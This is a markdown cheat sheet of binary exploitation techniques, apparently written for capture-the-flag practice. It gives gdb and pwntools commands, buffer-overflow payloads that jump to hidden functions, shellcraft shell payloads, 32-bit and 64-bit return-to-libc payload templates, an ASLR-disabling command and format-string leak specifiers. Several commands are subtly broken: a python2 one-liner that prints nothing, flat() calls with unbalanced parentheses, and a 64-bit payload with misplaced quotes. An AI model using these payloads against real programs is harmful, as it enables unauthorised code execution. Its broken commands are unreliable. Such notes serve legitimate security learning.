# Binary Exploitation

## Check Program File's Security
`checksec --file=<file>`

## Dynamic Analysis with gdb
### List Functions
`info functions`
### Disassemble Function
`disass <function-name>`
### Setting Breakpoint at Specific Line in Function
`break *<function-name>+<offset>`
### Check Value of Register
`x $<register-name>`
### Change Value of Register
`set *<address> = <new-value>`
### To Find How Many Bytes are Needed for a Buffer Overflow
`cyclic 100` to generate a string
Pass the string the program and check which part of the string get leaked in the register and copy that value then:
`cyclic -l <value-copied>`

### gdb Script Skeleton
```python
from pwn import *

exe = '<path-to-program-file>'
elf = context.binary = ELF(exe, checksec = False)

io = process(exe) # if the program is not local, io = remote('<domain/ip-address>', <port-number>)

# if the program requires to pass hex bytes:
# for 32-bit programs:
# payload = b'a' * 28 + p32(<hex-bytes>)
# for 64-bit programs:
# payload = b'a' * 28 + p64(<hex-bytes>)

io.sendlineafter(b'<delimiter-to-send-after>', b'<payload-to-send>')

io.interactive()
```

## Buffer Overflow with Python 2
If you know that the program has a buffer with only a certain number of characters that can be handled, you can use `python2` to generate a string of characters that will cause a buffer overflow, write that string to a file, and redirect that file into the program.
Ex: The program called `exampleapp` has a buffer of 16 bytes that is vulnerable to buffer overflows. There is a hidden function that contains the flag you are looking for but that function is never called. Use buffer overflow to reach that function with the following steps:
	1. Use `gdb` to find the address of the hidden function (e.g., `0x08049182`).
	2. Use `python2` to generate a string with 16 bytes + the address of the function and write it to a file (`python2 -c '"A" * 16 + "\x82\x91\x04\x08"' > payload`).
	3. Run the program and redirect the file containing the buffer overflow string to it (`./exampleapp < payload`)
You can also pass a file in `gdb` with `run < payload`.

## 64-Bit Buffer Overflow to Call a Hidden Function
`python2 -c 'print "A" * <buffer-size> + <hidden-function-address> + <pop-rdi-address> + <function-param1> + <pop-rsi-address> + <function-param2>'`

## Injection Assembly Instructions
### Generating Assembly Instructions with Shellcraft
`pwntools` has a package names `shellcraft` that can be used to generate assembly instrucitons for shell payloads.
`shellcraft i386.linux.sh -f a` command generates assembly instructions for a 32-bit program linux shell to be injected.
You can use `pwntools` and `shellcraft` within a `Python` script to generate the assembly and inject it into the target process.

## Returnin to libc (use if NX enabled on the binary and it is dynamically linked)
### Local Exploitation
#### Find libc Library Base Address
If `ASLR` is enabled then the address will be different each time.
`ldd <binary>`
### 32-bit
#### Locally Stop ASLR
You can turn off ASLR if the exploitation is happening on your local system.
`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` (default value was 2)
#### Get Offset of System in libc Library
`readelf -s </lib/i386-linux-gnu/libc.so.6 OR output-from-ldd-above> | grep system`
#### Get Offset of "/bin/sh"
`strings -a -t x </lib/i386-linux-gnu/libc.so.6 OR output-from-ldd-above> | grep "/bin/sh"`
#### Calculate HEX Values for Offsets
##### system HEX
`python3 -c "from pwn import *; print(flat(<system-offset> + <libc-offset>)))"`
##### /bin/sh HEX
`python3 -c "from pwn import *; print(flat(<binsh-offset> + <libc-offset>))"`
#### Generate Payload
`python2 -c 'print "A" * <cyclic-offset> + "<system-hex>" + "<return-address-can-be-0x0>" + "<binsh-hex>"'`
### 64-bit
Follows a lot of the same steps except the way arguments are passed to functions. In 64-bit arguments are passed through `rdi` and `rsi` registers instead of directly on the stack.
#### Get Offset of libc system 64-bit
`readelf -s </lib/x86_64-linux-gnu/libc.so.6 OR output-from-ldd-above> | grep system`
#### Get Offset of "/bin/sh" 64-bit
`strings -a -t x </lib/x86_64-linux-gnu/libc.so.6 OR output-from-ldd-above> | grep "/bin/sh"`
#### Finding `rdi`
Take the memory address of the output from the following command.
`ropper --file <binary> --search "pop rdi"`
##### `pop rdi` HEX
`python3 -c "from pwn import *; print(flat(p64(<pop-rdi-address>)))"`
**Note: If the instruction contains more than just the target register you need to account for that with `\x00`s**
#### Calculate HEX Values for Offsets
##### system HEX
`python3 -c "from pwn import *; print(flat(p64(<system-offset>) + p64(<64bit-libc-offset>))))"`
##### /bin/sh HEX
`python3 -c "from pwn import *; print(flat(p64(<binsh-offset>) + p64(<64bit-libc-offset>)))"`
#### Generate Payload
`python2 -c 'print "A" * <cyclic-offset> + "<pop-rdi-hex>" + "<binsh-hex> + <system-hex>"'`

## Format String Vulnerabilities
If the program uses some C function that accepts format specifiers and the program does not specify the format expected for the user input, we can inject specifiers to get information off the stack.
### Useful Specifiers
- `%p`: Get value of pointer
- `%x`: Get values in HEX
- `%10$x`: Get 10th value from the stack in HEX
- `%10$s`: Get the 10th value from the stack in string representation.
